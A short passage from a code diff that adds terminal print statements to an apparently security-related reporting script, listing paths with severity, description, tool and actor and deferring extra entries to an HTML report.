+            tl = f"  {faint}[{tool}]{rs}" if tool else ""
+            print(f"   {c}{g} {sev:8s}{rs} {desc}{tl}")
+            if who:
+                print(f"     {faint}{who}{rs}")
+        if len(tp) > 8:
+            print(f"     {faint}… and {len(tp)-8} more path(s) — see HTML report{rs}")
         print()
 
     # ── HTML report ───────────────────────────────────────────────────────────
